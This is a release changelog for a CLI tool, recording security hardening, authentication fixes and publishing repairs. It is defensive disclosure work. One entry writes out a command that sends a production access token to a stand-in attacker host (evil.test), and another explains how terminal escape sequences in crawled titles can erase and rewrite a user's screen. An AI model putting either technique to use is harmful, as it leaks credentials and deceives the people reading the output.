# @divinci-ai/cli

## 0.9.4

### Patch Changes

- `divinci trust verify` prints the signing key id (`signedBy.keyId`) of the manifest. Depends on the updated `@divinci-ai/trustbench-verifier`, which accepts provider ids it does not know yet (with a warning) instead of failing the run.
- Updated dependencies [fdafff2]
  - @divinci-ai/trustbench-verifier@0.9.0

## 0.9.3

### Patch Changes

- Updated dependencies [[`f4b0917`](https://github.com/Divinci-AI/server/commit/f4b0917ff23a72731dca6939fcd321058259592e)]:
  - @divinci-ai/server@0.7.0

## 0.9.2

### Patch Changes

- [`12698fc`](https://github.com/Divinci-AI/server/commit/12698fc63d4d826f4be582aa3e32b766c9c78472) - `divinci trust outputs` reads embedding-retrieval runs (the nDCG@10 embedding boards): one row per query with its nDCG@10 and Recall@100, a miss being a query with nothing relevant in its top 10, and the signed nDCG@10 headline with its 95% interval. Before, a retrieval run's queries were read as label samples and every one showed as a pass.

- Updated dependencies [[`cf78f67`](https://github.com/Divinci-AI/server/commit/cf78f67ec252a57cf6ec11dd0094613304e839fe)]:
  - @divinci-ai/trustbench-verifier@0.8.0

## 0.9.1

### Patch Changes

- Updated dependencies []:
  - @divinci-ai/types@0.1.16
  - @divinci-ai/server@0.6.1

## 0.9.0

### Minor Changes

- [`606d5f7`](https://github.com/Divinci-AI/server/commit/606d5f77070e59b0a5c22efc3cea86e792c49173) - `divinci api-key create` now refuses to create a key unless you scope it with `--permissions` or opt in to an unscoped key with the new `--full-access` flag.

  **Behaviour change.** Previously, omitting `--permissions` sent no permission list, and the API treats a missing or empty list as "grant everything". So the default output of the command was a full-access workspace credential, whether or not that was intended. Scripts that call `api-key create` without `--permissions` will now exit with an error instead of minting a key.

  To keep the old result deliberately, add `--full-access`:

  ```bash
  divinci api-key create --name "Admin automation" --full-access
  ```

  Better, scope the key to what the consumer needs:

  ```bash
  divinci api-key create --name ci --permissions rag:read,chat:read
  ```

  Also refused: `--permissions` with no actual entries (for example `--permissions ""` or `--permissions ,`), which would have sent an empty list and granted everything, and `--permissions` combined with `--full-access`. Blank entries inside a list (`rag:read,,chat:read`) are now dropped instead of sent. The API's handling of permission lists is unchanged; only the CLI's default changed.

### Patch Changes

- [`654c6d9`](https://github.com/Divinci-AI/server/commit/654c6d93d8be2abad6469a574a8082466dda9746) - `divinci trust get <runId>` printed `undefined  undefined` for every run: the
  API answers `{ run, benchmark, access }` and the command read the run's fields
  off the top level. It now reads the run from the envelope, names the benchmark
  by slug and title, and reports a body with no run as an error. `--output json`
  still prints the whole envelope.

- [`9a250ca`](https://github.com/Divinci-AI/server/commit/9a250ca455d8d1f6f223b72a7a9a9f93d935c03f) - `divinci trust outputs` now shows label-accuracy runs (e.g. the ContractNLI and FEVER-NLI boards). Their per-sample rows are under `samples`, not `results`, so the command used to print "No results in this run." for every one. Each sample now shows its gold label, the predicted label (or "invalid output" / "no answer text"), and the run's macro-F1 and invalid rate.

- Updated dependencies [[`6e7cee4`](https://github.com/Divinci-AI/server/commit/6e7cee4096198eaba94c418c63b3b8ccc79e59c9)]:
  - @divinci-ai/trustbench-verifier@0.7.0

## 0.8.0

### Minor Changes

- [`ff48b5b`](https://github.com/Divinci-AI/server/commit/ff48b5b08559c0504756878eaeb67f60a38db109) - `divinci qa publish-to-trust` gains `--run <runResultId>`, which publishes exactly one multi-release run's answers with no fills from other passes, and `--allow-degraded-retrieval`. The server now refuses by default to publish a run in which retrieval failed on some answers; the flag overrides that, and the override is signed into the outputs.

### Patch Changes

- Updated dependencies [[`ff48b5b`](https://github.com/Divinci-AI/server/commit/ff48b5b08559c0504756878eaeb67f60a38db109)]:
  - @divinci-ai/trustbench-verifier@0.5.0

## 0.7.1

### Patch Changes

- Updated dependencies []:
  - @divinci-ai/trustbench-verifier@0.4.0

## 0.7.0

### Minor Changes

- [`e23aadc`](https://github.com/Divinci-AI/server/commit/e23aadcc5c76e2490eafc89dd36d467b6a2b1227) - Stop the Hermes agent LIST response from carrying every agent's live proxy key, and ship the external-tools client.

  **`hermesAgents.list()` no longer returns `proxyApiKey`.** Each `hsk-` key is a spend primitive — every completion it buys is a billed unattended agent turn — and the list response carried one per agent, so a single `list()` (or `divinci hermes list --json`, or the `hermes_list` MCP tool) emitted a whole workspace's credentials in one payload. Five of them reached agent transcripts that way.

  The key is now returned only where a caller asked for one specific agent's: `create()`, `get()` and `regenerateKey()`. `list()` and `update()` return the new `HermesAgentSummary`, which is `HermesAgent` minus that field.

  This is a breaking change to the shape `list()` returns, which is why it is a minor on 0.x. If you read `proxyApiKey` from a listing, switch to `hermesAgents.get(workspaceId, agentId)` for the one agent you need — the credential should not be travelling in bulk regardless.

  `divinci hermes get` now prints the key as `hsk-abcd… (sha256:…)` rather than in full, because it is the routine read that fleet scripts and CI capture. `divinci hermes key <id>` still prints it, and `divinci hermes get --show-proxy-key` is the escape hatch. The fingerprint is a sha256 prefix rather than a truncation so two keys stay comparable without either being spendable.

  Also exports the external-tools client that has been in the checkout unreleased since 2026-09-07: `ExternalToolsClient`, `ExternalTool`, `ExternalToolType`, `ExternalToolAuthType`, `CreateExternalToolInput`, `UpdateExternalToolInput`.

### Patch Changes

- Updated dependencies [[`e23aadc`](https://github.com/Divinci-AI/server/commit/e23aadcc5c76e2490eafc89dd36d467b6a2b1227)]:
  - @divinci-ai/server@0.6.0

## 0.6.0

### Minor Changes

- [`9f7a2c6`](https://github.com/Divinci-AI/server/commit/9f7a2c6f5630802ce68d740cdb38a977b99f3716) - `arena-run` gains `--replicates`, and three ranking/ingestion bugs are fixed.

  - **`--replicates <n>` for `arena-run`.** Each variant was scored once, so a 2-point gap read exactly like a 50-point one. An _unchanged_ configuration has measured 79/87/87 on this platform (sd ≈ 3.8pp), so single-draw comparisons cannot separate a winner from a draw — one demo's 84.3% vs 84.0% was reported as a difference when it was not one.
  - **`arena-run` named variant 0 the winner regardless of score.** Validating against a hand-measured two-arm comparison reproduced the scores (0.37 vs 0.863) and then named the 0.37 arm _both_ best and worst.
  - **Pooled replicate scores reached the ranking but not the report.** Pooling was computed on a mapped copy of `perVariant` that was discarded after ranking, so `ranking.best.overallScore` was the mean of all replicates while `perVariant[i].overallScore` was that variant's _first_ replicate.
  - **`rag dedupe --apply` picked keepers blind to which copy the index references.** It chose by earliest `createdAt` alone, which assumes "duplicate" implies "unembedded". Repeated ingest attempts embed multiple copies of the same text, so the copy the live vector index points at is frequently not the oldest — deleting it removed reachable content.
  - **`record-chunker` is now selectable.** It was implemented, registered and deployed to both Cloud Run and the Worker, and still unusable because two allowlists rejected it.

  Also adds `divinci red-team`, running the same 32-probe corpus as TrustBench against a deployed release, and lets a proactive Hermes agent read its sibling's wakes.

- [`9f7a2c6`](https://github.com/Divinci-AI/server/commit/9f7a2c6f5630802ce68d740cdb38a977b99f3716) - **Security:** server-supplied text is now escaped before it reaches your terminal, and `--replicates` is bounded.

  Every table the CLI printed rendered server text unescaped: `output()` escapes in its JSON branch, but the table branch ended in a bare `String(value)`, and `formatKeyValueCell` did the same for plain values. A further **13 direct `console.log` sites** wrote values raw — 8 of them under `rag/` (`rag groups`, `rag targets`, `d1-provision`), plus `terms`, `qa runs`, `qa estimate-run`, `trust benchmarks` and `workspace clone`.

  This is genuinely untrusted input, not a colleague-annoys-colleague problem: a RAG document's `title` is the `<title>` of a **crawled web page**, so those commands render text authored by whatever site was ingested. The dangerous sequences are not colours — `ESC[2J` erases the display and `ESC[1;1H` homes the cursor, so a crafted title can blank the screen and rewrite what was printed above it, including the numbers you are about to act on. A bare newline is milder but corrupts every table it lands in.

  `arena-run --replicates` was floored but never capped, and the entire cost-confirmation block — including the $10 hard confirm — sits behind `if (!opts.yes)`. So `--yes --replicates 100000`, in exactly the CI context `--yes` is documented for, was an unattended multi-hour run with no prompt at any point. The spend is the smaller half: the judge is a shared production model on a per-minute quota, so a runaway arena run competes with live RAG traffic and surfaces there as 429s. Now capped at 25 — cost is linear in n while precision grows as 1/√n, so 3 → 25 buys 8.3× the spend for 2.9× tighter spread.

### Patch Changes

- [`9f7a2c6`](https://github.com/Divinci-AI/server/commit/9f7a2c6f5630802ce68d740cdb38a977b99f3716) - Point `repository` and `bugs` at github.com/Divinci-AI/sdk, which now exists.

  Seven packages already declared `Divinci-AI/sdk` and three pointed `bugs`
  there, but the repository had never been created — so ten fields across the
  published SDK linked to a 404, and npm renders `repository` as the
  "Repository" link on every package page. `cli` named `Divinci-AI/server`
  instead, which is private and therefore 404s for anonymous visitors just the
  same.

  The new repo is the public home for the SDK: issues, changelogs, and an
  explicit statement that the source is not public rather than an implication
  that it is.

  `repository.directory` is dropped rather than corrected. It pointed at
  `packages/<name>` (and, for cli, `workspace/sdk/packages/cli` — the two
  disagreed), and the public repo contains no package source, so any
  subdirectory pointer would name a path that does not exist there.

  `robot-avatar` also gains `license: MIT` and a LICENSE file. It had none, which
  means it was published to a public registry as all-rights-reserved — nobody
  could legally use it. MIT matches all seven sibling packages.

  `extension-bridge` is included because it is published (0.1.0 is live on npm)
  and had no `repository`, `bugs` or `homepage` at all. It was missed when the
  other eight were surveyed; the guard that ships with this change is what
  found it.

- Updated dependencies [[`9f7a2c6`](https://github.com/Divinci-AI/server/commit/9f7a2c6f5630802ce68d740cdb38a977b99f3716), [`9f7a2c6`](https://github.com/Divinci-AI/server/commit/9f7a2c6f5630802ce68d740cdb38a977b99f3716), [`ac06d95`](https://github.com/Divinci-AI/server/commit/ac06d9555c61ad71390fb42b1c0100a9a571445a)]:
  - @divinci-ai/server@0.5.0
  - @divinci-ai/types@0.1.15
  - @divinci-ai/trustbench-verifier@0.2.0

## 0.5.1

### Patch Changes

- [`300c9e4`](https://github.com/Divinci-AI/server/commit/300c9e4b28093d2396e65ecd5e2ebf755b974749) - Point `repository` and `bugs` at github.com/Divinci-AI/sdk, which now exists.

  Seven packages already declared `Divinci-AI/sdk` and three pointed `bugs`
  there, but the repository had never been created — so ten fields across the
  published SDK linked to a 404, and npm renders `repository` as the
  "Repository" link on every package page. `cli` named `Divinci-AI/server`
  instead, which is private and therefore 404s for anonymous visitors just the
  same.

  The new repo is the public home for the SDK: issues, changelogs, and an
  explicit statement that the source is not public rather than an implication
  that it is.

  `repository.directory` is dropped rather than corrected. It pointed at
  `packages/<name>` (and, for cli, `workspace/sdk/packages/cli` — the two
  disagreed), and the public repo contains no package source, so any
  subdirectory pointer would name a path that does not exist there.

  `robot-avatar` also gains `license: MIT` and a LICENSE file. It had none, which
  means it was published to a public registry as all-rights-reserved — nobody
  could legally use it. MIT matches all seven sibling packages.

  `extension-bridge` is included because it is published (0.1.0 is live on npm)
  and had no `repository`, `bugs` or `homepage` at all. It was missed when the
  other eight were surveyed; the guard that ships with this change is what
  found it.

- Updated dependencies [[`300c9e4`](https://github.com/Divinci-AI/server/commit/300c9e4b28093d2396e65ecd5e2ebf755b974749)]:
  - @divinci-ai/server@0.3.1
  - @divinci-ai/types@0.1.13
  - @divinci-ai/trustbench-verifier@0.1.1

## 0.5.0

### Minor Changes

- [`53dca23`](https://github.com/Divinci-AI/server/commit/53dca2398e360906f523036dc647e99f7ac1ff30) - `arena-run` gains `--replicates`, and three ranking/ingestion bugs are fixed.

  - **`--replicates <n>` for `arena-run`.** Each variant was scored once, so a 2-point gap read exactly like a 50-point one. An _unchanged_ configuration has measured 79/87/87 on this platform (sd ≈ 3.8pp), so single-draw comparisons cannot separate a winner from a draw — one demo's 84.3% vs 84.0% was reported as a difference when it was not one.
  - **`arena-run` named variant 0 the winner regardless of score.** Validating against a hand-measured two-arm comparison reproduced the scores (0.37 vs 0.863) and then named the 0.37 arm _both_ best and worst.
  - **Pooled replicate scores reached the ranking but not the report.** Pooling was computed on a mapped copy of `perVariant` that was discarded after ranking, so `ranking.best.overallScore` was the mean of all replicates while `perVariant[i].overallScore` was that variant's _first_ replicate.
  - **`rag dedupe --apply` picked keepers blind to which copy the index references.** It chose by earliest `createdAt` alone, which assumes "duplicate" implies "unembedded". Repeated ingest attempts embed multiple copies of the same text, so the copy the live vector index points at is frequently not the oldest — deleting it removed reachable content.
  - **`record-chunker` is now selectable.** It was implemented, registered and deployed to both Cloud Run and the Worker, and still unusable because two allowlists rejected it.

  Also adds `divinci red-team`, running the same 32-probe corpus as TrustBench against a deployed release, and lets a proactive Hermes agent read its sibling's wakes.

- [`53dca23`](https://github.com/Divinci-AI/server/commit/53dca2398e360906f523036dc647e99f7ac1ff30) - **Security:** server-supplied text is now escaped before it reaches your terminal, and `--replicates` is bounded.

  Every table the CLI printed rendered server text unescaped: `output()` escapes in its JSON branch, but the table branch ended in a bare `String(value)`, and `formatKeyValueCell` did the same for plain values. A further **13 direct `console.log` sites** wrote values raw — 8 of them under `rag/` (`rag groups`, `rag targets`, `d1-provision`), plus `terms`, `qa runs`, `qa estimate-run`, `trust benchmarks` and `workspace clone`.

  This is genuinely untrusted input, not a colleague-annoys-colleague problem: a RAG document's `title` is the `<title>` of a **crawled web page**, so those commands render text authored by whatever site was ingested. The dangerous sequences are not colours — `ESC[2J` erases the display and `ESC[1;1H` homes the cursor, so a crafted title can blank the screen and rewrite what was printed above it, including the numbers you are about to act on. A bare newline is milder but corrupts every table it lands in.

  `arena-run --replicates` was floored but never capped, and the entire cost-confirmation block — including the $10 hard confirm — sits behind `if (!opts.yes)`. So `--yes --replicates 100000`, in exactly the CI context `--yes` is documented for, was an unattended multi-hour run with no prompt at any point. The spend is the smaller half: the judge is a shared production model on a per-minute quota, so a runaway arena run competes with live RAG traffic and surfaces there as 429s. Now capped at 25 — cost is linear in n while precision grows as 1/√n, so 3 → 25 buys 8.3× the spend for 2.9× tighter spread.

### Patch Changes

- Updated dependencies [[`53dca23`](https://github.com/Divinci-AI/server/commit/53dca2398e360906f523036dc647e99f7ac1ff30)]:
  - @divinci-ai/server@0.3.0

## 0.4.2

### Patch Changes

- [`b17620e`](https://github.com/Divinci-AI/server/commit/b17620e1916e3af2492a961264f694973e4e0aa7) - **Security:** an unrecognized `--api-url` is now refused instead of being served **production** Auth0 credentials.

  `getAuth0Config()` previously fell back to the production tenant for any URL it didn't know, so `divinci --api-url https://evil.test auth login` authenticated against the real production tenant and then sent the resulting production access token to that host. A typo did the same thing by accident.

  Unknown hosts now error with a message naming the known hosts and the escape hatch. Custom or self-hosted deployments set all three of `DIVINCI_AUTH0_DOMAIN`, `DIVINCI_AUTH0_CLIENT_ID` and `DIVINCI_AUTH0_AUDIENCE` — all three required, because a partial override is how you end up authenticating against one environment while talking to another.

  This complements the `DIVINCI_ALLOW_NONPROD` gate on `auth login` (public builds target production only): that is the product policy at the command layer, while this is enforced at the config layer, so it also covers token refresh and revoke.

  `divinci bug-report` also now honours `--api-url`. It previously reported the profile's stored URL, so a report about an unrecognized URL named a different host than the one that actually failed.

## 0.4.1

### Patch Changes

- Fix the Auth0 audience used for the **dev** environment. `--api-url https://api.dev.divinci.app` requested audience `chat.divinci.app:8081`, while the dev server validates `http://localhost:8081` — so every authenticated call returned a 403 that no amount of re-authenticating could fix, the same wall that cli ≤0.2.9 hit against production.

  That literal `http://localhost:8081` looks like a local value that leaked into a deployed environment, and it was nearly "fixed" on the server instead. It isn't: it is a registered API identifier in the dev tenant, it is what the dev web client and the E2E suite already receive, and changing the server would have broken both. The CLI was the side that was wrong.

  Production and staging were unaffected — they use `divinci-prod` and `divinci-staging` respectively and were already correct.

  Also adds `src/auth/auth0-contract.lock.json`, which pins the tenant, audience and issuer per environment, with tests asserting the client matches it and a `scripts/verify-auth0-contract.mjs` that checks the lock against what the servers actually validate. All three environments now agree.

## 0.4.0

### Minor Changes

- [`3033037`](https://github.com/Divinci-AI/server/commit/30330374091d662fc55f551e2775b2c4b87dcf9a) - **New: `divinci bug-report`** — collects local diagnostics for a support request and sends nothing. Until now the CLI had no reporting path at all: every package advertised a `bugs.url` on a private GitHub repo that returns 404 for anyone outside the org, and the only command whose name looked like a support channel (`divinci feedback`) is an admin read of chat-message ratings. It prints the CLI/Node/platform, profile, API URL, auth type, token state, and — the two fields whose absence has cost days — the Auth0 **tenant and audience** the client is configured for. Never a token or API key.

  **New: opt-in error reporting** — `divinci privacy error-reporting on|off|status`. **Off unless you turn it on**, stored locally (a report is most needed when authentication is broken, so it cannot depend on a server-side preference), and `DIVINCI_DISABLE_TELEMETRY` overrides an opt-in. Reports carry only enums and bounded values — CLI version, command _name_, error kind, HTTP status, platform, and which environment the API URL and Auth0 tenant belong to. No arguments, paths, prompts, ids or tokens; there is no free-text field.

  **Fixed: an authentication failure no longer reads as "Permission denied."** The API answers an unverifiable token with 403, so the CLI reported an _authorization_ problem and sent users auditing API keys and workspace membership while the credential was the only thing wrong. An auth-shaped error code now routes to the re-authenticate message whatever the status; a genuine 403 still reports a permission problem.

  **New: the Auth0 contract is pinned.** `src/auth/auth0-contract.lock.json` records the tenant, audience and issuer per environment, with tests asserting the client matches it (including that production never uses a dev tenant, and that an unknown `--api-url` falls back to production rather than dev). This is the drift that made every `/api/v1` route 403 for anyone on cli ≤ 0.2.9.

### Patch Changes

- Updated dependencies [[`3033037`](https://github.com/Divinci-AI/server/commit/30330374091d662fc55f551e2775b2c4b87dcf9a), [`3033037`](https://github.com/Divinci-AI/server/commit/30330374091d662fc55f551e2775b2c4b87dcf9a)]:
  - @divinci-ai/server@0.2.1
  - @divinci-ai/types@0.1.12

## 0.2.17

### Patch Changes

- Republish with resolved dependency versions (second occurrence). `server@0.1.13`, `cli@0.2.16`, `embed-chat-ui@0.1.4`, and `mcp@0.1.1` again shipped literal `workspace:*` dependencies: the publish guard was wired into `prepublishOnly`, which `npm publish` runs but `npm pack` does not — so an `npm pack` in the package directory produced an unrewritten tarball without tripping the guard, and publishing a tarball runs no lifecycle scripts. The guard now runs from `prepack` (fires on both `npm pack` and `npm publish`; pnpm-driven packs remain exempt since pnpm rewrites the protocol), and `scripts/publish-all.sh` performs the full pack → verify-tarball → publish → verify-registry sequence with hard stops. No code changes.

- Updated dependencies []:
  - @divinci-ai/server@0.1.14

## 0.2.16

### Patch Changes

- Republish with resolved dependency versions. The previous versions (`server@0.1.12`, `cli@0.2.15`, `embed-chat-ui@0.1.3`) were published from the package directory with plain `npm publish`, which does not rewrite pnpm's `workspace:*` protocol — so they shipped with unresolved `workspace:*` dependencies and fail to install from the registry. No code changes. A `prepublishOnly` guard now blocks `npm`-driven publishes of any package whose manifest still contains `workspace:*` dependencies.

- Updated dependencies []:
  - @divinci-ai/server@0.1.13

## 0.2.15

### Patch Changes

- [`b950abe`](https://github.com/Divinci-AI/server/commit/b950abeabb9a64c4307bfe49178df32c2841f894) Thanks [@mikeumus](https://github.com/mikeumus)! - Fix `divinci api-key list|rotate|delete|update` sending requests with an unresolved workspace ID when the authenticated profile has no workspace configured and `--workspace` isn't passed. Previously these commands computed `workspaceId` with no validation, so a missing workspace silently reached the server as `/api/v1/workspaces/undefined/api-keys`, producing an opaque "400 bad form data" error (and, per a partner report, was implicated in a harder-to-reproduce crash). They now use the shared `requireWorkspaceId()` guard (already used by `api-key request-limit`) to fail fast with an actionable "No workspace selected" message, matching the existing guard on `api-key create`.

- [`a4ce8cd`](https://github.com/Divinci-AI/server/commit/a4ce8cd400d4ebf8ded42aaadce708b09280607f) Thanks [@mikeumus](https://github.com/mikeumus)! - Fix `divinci auth login --api-key` being completely unreachable. The `login` subcommand's boolean intent-flag shared the name `--api-key` with the root program's value-taking `--api-key <key>` override, so commander always resolved the root's definition and the subcommand's local flag never populated — `apiKeyLogin()` was dead code. The subcommand flag is renamed to `--use-api-key`, and API-key auth now also triggers automatically when an explicit root-level `--api-key <value>` is supplied (using that value directly instead of re-prompting), since providing a key already signals API-key-auth intent.

- Fix `divinci auth login` on Windows silently truncating the Auth0 authorize URL at the first `&`. `openBrowser()` launched the URL via `cmd /c start`, and cmd re-parses the joined command line, splitting on unescaped `&` — so the browser opened a URL missing `client_id` and everything after it. The URL is now quoted with `windowsVerbatimArguments` so cmd receives it intact.

- Updated dependencies [[`1ac9388`](https://github.com/Divinci-AI/server/commit/1ac9388a8f19dfcf4fc7ac4957777ad1285da715), [`1d0eede`](https://github.com/Divinci-AI/server/commit/1d0eede46b51f13c0540e75b74babf64e49717e5)]:
  - @divinci-ai/types@0.1.10
  - @divinci-ai/server@0.1.12

## 0.2.14

### Patch Changes

- `release update` gains `--thread-prefix`, `--conversation-starters`,
  `--chat-disclaimer`, `--chat-welcome-message`, and
  `--clear-terms-of-service`. The first four create their referenced
  sub-document and point the release at it in one step (mirroring the MCP
  `release_update` tool's handling), instead of requiring a raw API call.
  `--clear-terms-of-service` clears a release's Terms of Service "I Agree"
  gate without disturbing its `chatDisclaimer` banner.

## 0.2.13

### Patch Changes

- Fix `divinci auth login` on Windows opening a browser page with
  `invalid_request: Missing required parameter: client_id`, even though the
  generated authorize URL was correct. `openBrowser()` launched the URL via
  `cmd /c start "" <url>` without `windowsVerbatimArguments`. cmd.exe
  re-parses the joined command line itself and splits on unescaped `&` —
  which every Auth0 authorize URL contains in its query string
  (`response_type=code&client_id=...&...`) — silently truncating the URL
  right after `response_type=code` before the browser ever saw `client_id`.
  Fixed by quoting the URL and passing `windowsVerbatimArguments: true` to
  `execFile`, per Node's documented Windows cmd.exe caveat. macOS/Linux were
  unaffected (no shell metacharacter re-parsing on those `open`/`xdg-open`
  code paths). Added regression coverage in `tests/unit/auth/oauth.test.ts`.

## 0.2.12

### Patch Changes

- 0.2.11 was still published with the literal `workspace:*` protocol in
  `dependencies` (same `EUNSUPPORTEDPROTOCOL` failure as 0.2.9/0.2.10) —
  verified via `npm view @divinci-ai/cli@0.2.11 dependencies`. A local
  `pnpm pack` from this directory correctly rewrites `workspace:*` to the
  real published versions (`@divinci-ai/server@0.1.10`,
  `@divinci-ai/types@0.1.8`, `@divinci-ai/trustbench-verifier@0.1.0`), so
  the regression is in how 0.2.11 was actually published (likely
  `npm publish` was run instead of `pnpm publish`), not in the package
  source. No source changes — republish only, via `pnpm publish` from
  `workspace/sdk/packages/cli`.

## 0.2.11

### Patch Changes

- Fix `npm install -g @divinci-ai/cli` failing with
  `npm error code EUNSUPPORTEDPROTOCOL` / `Unsupported URL Type "workspace:"`.
  0.2.9 and 0.2.10 were published via `npm publish`, which does not rewrite
  pnpm's `workspace:*` protocol in `dependencies` — the published tarball
  shipped the literal string `workspace:*` for `@divinci-ai/server`,
  `@divinci-ai/types`, and `@divinci-ai/trustbench-verifier`, which `npm`
  cannot resolve. This release is published via `pnpm publish`, which
  rewrites `workspace:*` to the real published version range at publish
  time. No source changes — republish only.

## 0.2.10

### Patch Changes

- Ship the `--profile` fixes for `divinci auth login` / `auth logout` that
  landed in source (`a68180cdd3`, `2348a25c18`) but were never published in
  0.2.9. Without this release, `--profile staging` (and any non-default
  profile) was silently ignored when resolving the API URL, so the CLI could
  send a staging Auth0 `domain` paired with a mismatched `client_id` (or
  vice versa) and Auth0 would reject the `/authorize` request with
  `invalid_request: Missing required parameter: client_id`. `--profile` now
  correctly infers the API URL (and matching Auth0 tenant) from the profile
  name, and login/logout write to the profile that was actually requested.

## 0.2.2

### Patch Changes

- [#776](https://github.com/Divinci-AI/server/pull/776) [`adca466`](https://github.com/Divinci-AI/server/commit/adca46641172efcef716f251a16a669270e646cc) Thanks [@mikeumus](https://github.com/mikeumus)! - Wire up `divinci api-key` command group (`create`, `list`, `rotate`, `delete`).
  The command implementations existed under `src/commands/api-key/` but were
  never registered in the top-level program — long-lived workspace API keys
  could only be minted via the raw `divinci api POST …` passthrough.

  Powers daemon / CI workflows that need a non-expiring credential (e.g.
  FileVacuum's `divinci.api_key` in `filevacuum.toml`). Secret is returned
  exactly once at create / rotate; OAuth is required to call any of these so
  an API-key-authed caller can't escalate to mint another key.

## 0.2.1

### Patch Changes

- Read `divinci --version` from the package's own `package.json` at runtime
  instead of from a hardcoded string in `src/index.ts`. The previous
  hardcoded value drifted during the 0.2.0 release (the binary kept
  reporting `0.1.0` even though the published tarball was 0.2.0) because
  changesets only bumps `package.json` — not source-code constants. The
  runtime reader walks both compiled and source paths and guards against
  reading a monorepo-root `package.json` by name-matching `@divinci-ai/cli`.

## 0.2.0

### Minor Changes

- [`e3b58af`](https://github.com/Divinci-AI/server/commit/e3b58afe8809dffbd6301fef787c8ddff0069b28) Thanks [@mikeumus](https://github.com/mikeumus)! - Substantial RAG command expansion, an auto-generated docs system, and
  several quality-of-life fixes since 0.1.0.

  **New commands**

  - `divinci rag targets` — full CRUD over RAG vector indexes: list, get,
    create, update settings, delete, and backwards-compat default when no
    subcommand is given.
  - `divinci rag targets migrate` — clone an index with a new config and
    bulk-reindex every file into the new target. Handy for flipping
    embedding models or chunking strategies without losing data.
  - `divinci rag targets bulk-reindex` — re-queue every file in a vector
    index, with optional per-file filtering.
  - `divinci rag groups` — CRUD over RAG vector groups (collections of
    indexes): list, create, get, update, archive.
  - `divinci rag context` — semantic context retrieval directly from the
    CLI, useful for scripted prompt assembly.
  - `divinci rag config` — get/set RAG collection settings
    (minimumSimilarity, contextPerMessage, embeddingModel) from the
    terminal.
  - `divinci rag reindex <fileId>` — single-file re-index with the new
    `--chapter-aware` flag for structured documents (books, manuals)
    that benefit from chapter-heading context prepended to each chunk.
  - `divinci rag prune-ghost-refs` — clean up stale references left in
    vector arrays when files disappear out-of-band.
  - `divinci rag targets delete` — explicit single-target delete with
    confirmation.
  - `divinci rag chunks` — list/read individual chunks from a file for
    debugging retrieval.
  - `divinci config` — whitelabel title/description management (beyond
    the RAG-specific config command).

  **Fixes**

  - `divinci rag groups ls` — Vectors count column was rendering the
    literal template literal instead of the value. Display bug, no data
    impact.
  - `divinci rag upload` — default chunking tool switched from
    `openparse` to `langextract` to match the server default.

  **Tooling**

  - Added `pnpm run docs:generate` — walks the Commander tree and emits
    `cli-commands.json` for the auto-generated reference page at
    https://divinci.ai/cli/. The docs on that page are guaranteed to
    match the shipped binary because they come directly from the
    source.

  **Underlying public API**

  Several of the new commands are backed by new public API endpoints
  that landed in the same window: DELETE /api/v1/rag/targets/:id,
  group CRUD, semantic context retrieval, FTS filters on chunk search,
  and divinci-pageindex as a selectable vector index tool.

### Patch Changes

- [`8239556`](https://github.com/Divinci-AI/server/commit/82395567943bedda943b07218199c5427539e758) Thanks [@mikeumus](https://github.com/mikeumus)! - Fix `divinci qa multi-release-run` polling loop hanging indefinitely.

  The polling code checked `parsed.status` directly, but the
  `GET /runs/:id` endpoint returns a wrapper `{ run: {...}, orphanReason? }`.
  The "complete" check never fired and the CLI hung for the full 2-hour
  `--http-timeout-ms` default while the run had long since finished
  server-side. Fix unwraps `parsed.run` to align with how
  `divinci qa runs get` already reads the same endpoint.
